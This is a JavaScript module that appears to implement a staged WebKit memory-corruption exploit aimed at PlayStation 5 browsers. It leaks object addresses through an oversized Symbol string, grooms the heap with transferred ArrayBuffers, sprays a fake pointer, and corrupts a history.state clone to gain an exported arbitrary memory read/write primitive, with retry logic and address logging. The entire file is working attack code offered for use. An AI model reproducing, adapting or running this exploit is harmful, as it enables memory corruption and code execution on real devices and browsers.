const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const LEAK_STRING_LENGTH = 924176;
const CELL_BYTES = 0x30;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;
const MEMORY_WINDOW_SIZE = 0x100;
const CANARY_OFFSET = 0x20;
const LEAK_SLOT_OFFSET = 0x20;

const symbolToString = Symbol.prototype.toString;
const viewHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);
const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,]);
const identityBytes = new Uint8Array(8);
const nativeTarget = parseInt;

let attemptNumber = 0
let keepIndex = 0
let keepAlive = null
let onEvent = null
let settleResolve = null
let memoryView = null
let memoryMirror = null
let targetView = null
let fakeHost = null
let markerObjectA = null
let targetHolder = null
let outerGraph = null
let leakedScope = null
let getterCarrier = null
let preparedSymbolObject = null
let capturedString = null
let capturedWords = null
let copiedLength = 0
let captureError = null
let predecessorWords = null
let liveCandidate = null
 
function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function buffer(size) {
  return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
  for (let i = start; i < end; ++i) {
    if (bytes[i] !== 0) return false;
  }
  return true;
}

function usesLegacyWebKit() {
  return /PlayStation 5\/[0-8]\./.test(navigator.userAgent);
}

function fillerBigIntCount() {
  if (!usesLegacyWebKit()) return 1;
  return [2, 4, 6, 7][(attemptNumber - 1) % 4];
}

function uint32At(bytes, offset) {
  const low16 = bytes[offset] + bytes[offset + 1] * 0x100;
  const high16 = bytes[offset + 2] + bytes[offset + 3] * 0x100;
  return low16 + high16 * 0x10000;
}

function low48At(bytes, offset) {
  const low32 = uint32At(bytes, offset);
  const high16 = bytes[offset + 4] + bytes[offset + 5] * 0x100;
  return low32 + high16 * 0x100000000;
}

function readBytes(destination, source, count) {
  for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
  for (let i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}

function redirectView(candidate, address) {
  const high = Math.floor(address / 0x100000000);
  scratchWords[0] = address - high * 0x100000000;
  scratchWords[1] = high;
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreView(candidate) {
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = viewHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
  if (words[offset + 3] !== 0) return NaN;
  const low32 = words[offset] + words[offset + 1] * 0x10000;
  return low32 + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
  return plausibleAddress(value) && value % 8 === 0;
}

function plausibleAddress(value) {
  return Number.isSafeInteger(value) &&
    value > 2 ** 32 &&
    value < 2 ** 48;
}

function canonicalLow48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function encodedHeaderNumber() {
  const raw = new ArrayBuffer(8);
  const words = new Uint32Array(raw);
  const number = new Float64Array(raw);
  words[0] = 0x00004250;
  words[1] = 0x01062800;
  return number[0];
}

function emit(tag, detail, type) {
  if (onEvent !== null)
    onEvent(tag, detail === undefined ? "" : String(detail), type);
}

function isOurCorruptedView(candidate, originalVector) {
  if (!plausibleCell(originalVector)) return false;
  redirectView(candidate, originalVector + CANARY_OFFSET);
  readBytes(identityBytes, memoryView, 8);
  restoreView(candidate);
  return sameBytes(identityBytes, identityMagic, 8) && memoryView[0] === 0x3c;
}

function dropAttemptReferences() {
  memoryView = null;
  memoryMirror = null;
  targetView = null;
  fakeHost = null;
  markerObjectA = null;
  targetHolder = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
}

function releaseAttempt() {
  dropAttemptReferences();
  keepAlive = null;
  try {
    history.replaceState(null, "");
  } catch {}
}

function retry(reason, safeToRelease) {
  const nextAttempt = attemptNumber + 1;
  emit("Retry", `${reason} attempt ${nextAttempt}`);
  if (safeToRelease) releaseAttempt();
  setTimeout(() => {
    attemptNumber = nextAttempt;
    startAttempt();
  }, safeToRelease ? 750 : 50);
}

function finishEarlySafeAttempt(reason, detail = "") {
  retry(detail ? `${reason}: ${detail}` : reason, true);
}
 
function resetAttemptState() {
  dropAttemptReferences();
  copiedLength = 0;
  captureError = null;
  keepIndex = 0;
  keepAlive = [];
  liveCandidate = null;
}

function startAttempt() {
  resetAttemptState();
  emit("Attempt", String(attemptNumber));
  try {
    storeHistoryGraph();
    for (let i = 0; i < 8; ++i)
      memoryView[CANARY_OFFSET + i] = identityMagic[i];
    prepareAddressLeak();
  } catch (error) {
    finishEarlySafeAttempt(
      "setup failed",
      `${error?.name}: ${String(error?.message).slice(0, 80)}`,
    );
  }
}

// Address-leak helper
function leakScopeObject() {
  class Leaker {
    leak() {
      return super.foo;
    }
  }
  Leaker.prototype.__proto__ = new Proxy({}, {
    get: function (target, property, receiver) {
      return receiver;
    },
  });
  const leak = Leaker.prototype.leak;
  return (function () {
    return leak();
  })();
}

function prepareSymbolWrapper(getter) {
  leakedScope = leakScopeObject();
  if (leakedScope === undefined || leakedScope === null)
    throw new Error("Scope not leaked.");

  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;

  Object.defineProperty(leakedScope, "g", {
    get: getter,
    configurable: true,
  });
  return Object(leakedScope.g);
}

// Stage 1: build the objects later reached through the corrupted clone.
function prepareExploitObjects() {
  const memoryBuffer = new ArrayBuffer(MEMORY_WINDOW_SIZE);
  memoryView = new Uint8Array(memoryBuffer);
  memoryMirror = new Uint8Array(memoryBuffer);
  memoryMirror[0] = 0x3c;

  const guardBuffer = new ArrayBuffer(0x20);
  targetView = new Uint8Array(guardBuffer);
  targetView[0] = 0xa5;
  const lengthMarker = { keep: 0x51515151 };

  fakeHost = {
    q0: encodedHeaderNumber(),
    q1: 1.1,
    q2: memoryView,
    q3: lengthMarker,
    q4: 2.2,
    q5: 3.3,
  };

  delete fakeHost.q1;
  delete fakeHost.q4;
  delete fakeHost.q5;

  const domAnchor = document.createElement("textarea");
  markerObjectA = { marker: 0x4d41524b };
  const markerObjectB = { marker: 0x4d41524c };
  const holderGuardA = { marker: 0x484f4c44 };
  const holderGuardB = { marker: 0x47554152 };
  targetHolder = {
    q0: nativeTarget,
    q1: domAnchor,
    q2: markerObjectA,
    q3: markerObjectB,
    q4: holderGuardA,
    q5: holderGuardB,
  };
}

function storeHistoryGraph() {
  const referenceTarget = { marker: 0x51515151 };
  prepareExploitObjects();

  const fillerGraph = new Array(0xfffd);
  let pos = 0;
  const huge = 1n << 40n;
  for (let i = 0; i < fillerBigIntCount(); i++)
    fillerGraph[pos++] = huge + BigInt(i);
  while (pos < fillerGraph.length) fillerGraph[pos++] = {};

  outerGraph = new Array(CONTROL_INDEX + 1);
  outerGraph[0] = fillerGraph;
  outerGraph[1] = referenceTarget;
  outerGraph[2] = referenceTarget;
  outerGraph[CONTROL_INDEX] = -64000;
 
  history.replaceState(outerGraph, "");
}

// Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
function prepareAddressLeak() {
  capturedWords = new Uint16Array(16);
  getterCarrier = function getterCarrierFunction() {
    return 7;
  };

  getterCarrier[0] = fakeHost;
  for (let i = 1; i < 9000000; i++) getterCarrier[i] = 0;
  getterCarrier[1] = targetHolder;
  getterCarrier[2] = fakeHost;
  getterCarrier[3] = targetHolder;
  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);

  setTimeout(captureAddresses, 50);
  setTimeout(finishAddressLeak, 100);
}

function captureAddresses() {
  try {
    capturedString = symbolToString.call(preparedSymbolObject);
    copiedLength = capturedString.length;
    if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) {
      capturedString = null;
      return;
    }
    for (let i = 0; i < 16; i++)
      capturedWords[i] = capturedString.charCodeAt(7 + i);
  } catch (error) {
    captureError = error;
  }
}

// Stage 3 helper: fill the reclaimed predecessor allocation with fakeHost.
function fillPointerSpray(backing, pointer) {
  if (!plausibleCell(pointer))
    throw new Error("Invalid fake address");

  const high = Math.floor(pointer / 0x100000000);
  const low = pointer - high * 0x100000000;

  predecessorWords = new Uint32Array(backing);
  for (let i = 0; i < predecessorWords.length; i += 2) {
    predecessorWords[i] = low;
    predecessorWords[i + 1] = high;
  }

  const last = predecessorWords.length - 2;
  if (
    predecessorWords[0] !== low ||
    predecessorWords[1] !== high ||
    predecessorWords[last] !== low ||
    predecessorWords[last + 1] !== high
  )
    throw new Error("Pointer Fill verification failed");
}

function clearPointerSpray() {
  if (predecessorWords !== null) predecessorWords.fill(0);
}

function invalidClone(reason, safe) {
  clearPointerSpray();
  return { status: "invalid", safe, reason };
}

function validStructure(header) {
  const id = uint32At(header, 0);
  return id >= 0x100 && id < 0x08000000;
}

function validViewLayout() {
  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
  return allZero(viewHeader, 0x1c, 0x20) &&
    viewHeader[0x20] <= 3 &&
    allZero(viewHeader, 0x21, 0x28);
}

function inspectViewHeader() {
  const vector = low48At(viewHeader, 0x10);

  if (
    !validStructure(viewHeader) ||
    !plausibleAddress(low48At(viewHeader, 0x08)) ||
    !plausibleAddress(vector) ||
    uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE ||
    !validViewLayout()
  )
    return null;

  return vector;
}

function makeUpgradedHeader() {
  for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];
  const flags = scratchBytes[6] + scratchBytes[7] * 0x100 - 2;
  scratchBytes[6] = flags & 0xff;
  scratchBytes[7] = (flags >> 8) & 0xff;

  const value = scratchDouble[0];
  return Number.isFinite(value) ? value : null;
}

function inspectHolder(candidate, holderAddress) {
  redirectView(candidate, holderAddress);
  readBytes(holderHeader, memoryView, HOLDER_BYTES);
  if (!sameBytes(holderHeader, memoryView, HOLDER_BYTES)) return null;

  let functionAddress = null;
  for (let offset = 0x10; offset <= 0x38; offset += 8) {
    const address = low48At(holderHeader, offset);
    if (!canonicalLow48(holderHeader, offset) || !plausibleCell(address))
      return null;
    if (offset === 0x10) functionAddress = address;
  }

  return functionAddress;
}

function inspectFunction(candidate, address) {
  redirectView(candidate, address);
  readBytes(targetHeader, memoryView, 0x20);

  const executable = low48At(targetHeader, 0x18);

  if (
    !validStructure(targetHeader) ||
    !plausibleAddress(low48At(targetHeader, 0x08)) ||
    !plausibleAddress(low48At(targetHeader, 0x10)) ||
    !plausibleCell(executable)
  )
    return null;

  return { executable, type: targetHeader[5] };
}

function inspectNativeExecutable(candidate, address) {
  redirectView(candidate, address);
  readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);

  const nativeFunction = low48At(targetHeader, 0x28);
  const nativeConstructor = low48At(targetHeader, 0x30);
  if (
    !validStructure(targetHeader) ||
    !canonicalLow48(targetHeader, 0x28) ||
    !canonicalLow48(targetHeader, 0x30) ||
    !plausibleAddress(nativeFunction) ||
    !plausibleAddress(nativeConstructor) ||
    nativeFunction === nativeConstructor
  )
    return null;

  return {
    nativeFunction,
    nativeConstructor,
    type: targetHeader[5],
  };
}

function rejectRedirected(candidate, reason) {
  restoreView(candidate);
  return invalidClone(reason, false);
}

// Stage 4: history.state should now return a corrupted Uint8Array.
function inspectClonedGraph(holderAddress) {
  let clone = null;
  let candidate = null;
  let headerRead = false;
  let vectorRedirected = false;

  try {
    clone = history.state;
    if (clone.length !== 0x50001) {
      clone[DUPLICATE_INDEX] = undefined;
      return invalidClone("Unexpected clone length", true);
    }

    if (clone[1] === clone[DUPLICATE_INDEX]) {
      clone[DUPLICATE_INDEX] = undefined;
      clearPointerSpray();
      return { status: "unchanged", safe: true };
    }

    candidate = clone[DUPLICATE_INDEX];
    clone[DUPLICATE_INDEX] = undefined;
    clone = null;

    readBytes(viewHeader, candidate, CELL_BYTES);
    headerRead = true;

    const originalVector = inspectViewHeader();
    if (originalVector === null) {
      const safe = allZero(viewHeader, 0, CELL_BYTES);
      return invalidClone("Invalid view header", safe);
    }

    vectorRedirected = true;
    const identityProved = isOurCorruptedView(candidate, originalVector);
    vectorRedirected = false;
    if (!identityProved) return invalidClone("Wrong corrupted view", false);

    const newHeader = makeUpgradedHeader();
    if (newHeader === null) return invalidClone("Invalid view flags", false);

    fakeHost.q0 = newHeader;
    if (fakeHost.q0 !== newHeader) return invalidClone("Header update failed", false);

    vectorRedirected = true;
    const nativeTargetAddress = inspectHolder(candidate, holderAddress);
    if (nativeTargetAddress === null)
      return rejectRedirected(candidate, "Invalid holder layout");

    const functionInfo = inspectFunction(candidate, nativeTargetAddress);
    if (functionInfo === null)
      return rejectRedirected(candidate, "Invalid function layout");

    const nativeInfo = inspectNativeExecutable(candidate, functionInfo.executable);
    if (nativeInfo === null)
      return rejectRedirected(candidate, "Invalid executable layout");

    globalThis.__ps5NativeCtor = nativeInfo.nativeConstructor;

    redirectView(candidate, nativeTargetAddress);
    const functionMatches =
      low48At(memoryView, 0x18) === functionInfo.executable &&
      memoryView[5] === functionInfo.type;

    redirectView(candidate, functionInfo.executable);
    const nativeMatches =
      low48At(memoryView, 0x28) === nativeInfo.nativeFunction &&
      low48At(memoryView, 0x30) === nativeInfo.nativeConstructor &&
      memoryView[5] === nativeInfo.type;

    restoreView(candidate);
    vectorRedirected = false;
    if (
      !functionMatches ||
      !nativeMatches ||
      memoryView[0] !== 0x3c ||
      memoryMirror[0] !== 0x3c ||
      targetView[0] !== 0xa5
    ) {
      return invalidClone("Pointer check failed", false);
    }

    liveCandidate = candidate;
    clearPointerSpray();
    return {
      status: "ready",
      originalVector,
      functionAddress: nativeTargetAddress,
      executableAddress: functionInfo.executable,
      nativeInfo,
    };
  } catch (error) {
    const safe =
      candidate === null &&
      clone === null &&
      !headerRead &&
      error?.name === "TypeError";
    if (clone !== null) {
      try {
        clone[DUPLICATE_INDEX] = undefined;
      } catch {}
    }
    if (candidate !== null && headerRead && vectorRedirected) {
      try {
        restoreView(candidate);
      } catch {}
    }
    try {
      targetView[0] = 0xa5;
      memoryMirror[0] = 0x3c;
    } catch {}
    try {
      clearPointerSpray();
    } catch {}
    return { status: "error", safe, error };
  }
}

// Stage 3: create the required holes, spray fakeHost.
function groomHeap(fakeAddress, holderAddress) {
  let outcome;
  try {
    const channel = new MessageChannel();
    channel.port1.close();
    channel.port2.close();

    for (let i = 0; i < 512; i++)
      keepAlive[keepIndex++] = buffer(0x10000);

    let slab = buffer(0x400000);
    channel.port1.postMessage(0, [slab]);
    slab = null;

    const butterflyHole1 = buffer(0x81000);
    const butterflyHole2 = buffer(0x81000);
    const separator = buffer(0x10000);
    const earlyHole = buffer(0x70000);
    const guard = buffer(0x90000);
    const predecessor = buffer(0x80000);
    const finalHole = buffer(0x80000);

    fillPointerSpray(predecessor, fakeAddress);
    keepAlive[keepIndex++] = separator;
    keepAlive[keepIndex++] = guard;
    keepAlive[keepIndex++] = predecessor;

    channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
    outcome = inspectClonedGraph(holderAddress);
  } catch (error) {
    try {
      clearPointerSpray();
    } catch {}
    outcome = { status: "error", safe: true, error };
  }
  finishAttempt(outcome, holderAddress, fakeAddress);
}

function finishAddressLeak() {
  if (captureError !== null)
    return finishEarlySafeAttempt("Address leak failed", `${captureError?.name}: ${String(captureError?.message).slice(0, 80)}`);
  if (copiedLength === 0)
    return finishEarlySafeAttempt("Address leak did not finish");
  if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff))
    return finishEarlySafeAttempt("Unexpected copy length", `got ${copiedLength}, expected ${LEAK_STRING_LENGTH}`);

  const hostAddress = pointerFromWords(capturedWords, 0);
  const holderAddress = pointerFromWords(capturedWords, 4);
  if (
    hostAddress !== pointerFromWords(capturedWords, 8) ||
    holderAddress !== pointerFromWords(capturedWords, 12) ||
    hostAddress === holderAddress ||
    !plausibleCell(hostAddress) ||
    !plausibleCell(holderAddress)
  ) return finishEarlySafeAttempt("Invalid leaked addresses");

  const fakeAddress = hostAddress + 0x10;
  if (!plausibleCell(fakeAddress))
    return finishEarlySafeAttempt("Invalid fake object address", hex(hostAddress));
  groomHeap(fakeAddress, holderAddress);
}

// Stage 5: retry placement misses or publish the validated memory window.
function finishAttempt(outcome, holderAddress, fakeAddress) {
  if (outcome.status === "error") {
    emit("Failed", String(outcome.error?.message || outcome.error));
    return retry("Heap placement failed", outcome.safe);
  }

  if (outcome.status === "unchanged")
    return retry("Clone was not corrupted", true);

  if (outcome.status === "invalid")
    return retry(outcome.reason, outcome.safe);

  if (outcome.status !== "ready" || liveCandidate === null) {
    emit("Failed", "Memory window validation failed");
    liveCandidate = null;
    return retry("Memory window validation failed", false);
  }

  try {
    history.replaceState(null, "");
  } catch {}

  const resolve = settleResolve;
  settleResolve = null;
  if (resolve !== null) resolve(createMemoryWindow(holderAddress));

  emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
  emit("host_addr", hex(fakeAddress - 0x10), "info");
  emit("holder_addr", hex(holderAddress), "info");
  emit("fake_addr", hex(fakeAddress), "info");
  emit("view_vector", hex(outcome.originalVector), "info");
  emit("function_addr", hex(outcome.functionAddress), "info");
  emit("executable_addr", hex(outcome.executableAddress), "info");
  emit("native_function", hex(outcome.nativeInfo.nativeFunction), "info");
  emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "info");
}

function createMemoryWindow(holderAddress) {
  return {
    setAddress(address) {
      if (liveCandidate === null)
        throw new Error("Memory window is no longer live");
      if (!plausibleAddress(address))
        throw new RangeError(`Invalid address ${address}`);
      redirectView(liveCandidate, address);
    },
    resetAddress() {
      if (liveCandidate === null)
        throw new Error("Memory window is no longer live");
      restoreView(liveCandidate);
    },
    bytes: memoryView,
    size: MEMORY_WINDOW_SIZE,
    leakAddress: holderAddress + LEAK_SLOT_OFFSET,
    setLeakObject(value) {
      targetHolder.q2 = value;
    },
    clearLeakObject() {
      targetHolder.q2 = markerObjectA;
    },
  };
}

export function establishPrimitive(eventHandler = null) {
  if (settleResolve !== null)
    return Promise.reject(new Error("Already Running..."));
  if (
    typeof BigInt !== "function" ||
    typeof MessageChannel !== "function" ||
    typeof Symbol !== "function" ||
    typeof history === "undefined" ||
    typeof history.replaceState !== "function"
  )
    return Promise.reject(new Error("Unsupported Browser"));

  onEvent = typeof eventHandler === "function" ? eventHandler : null;

  attemptNumber = 1;

  return new Promise((resolve) => {
    settleResolve = resolve;
    startAttempt();
  });
}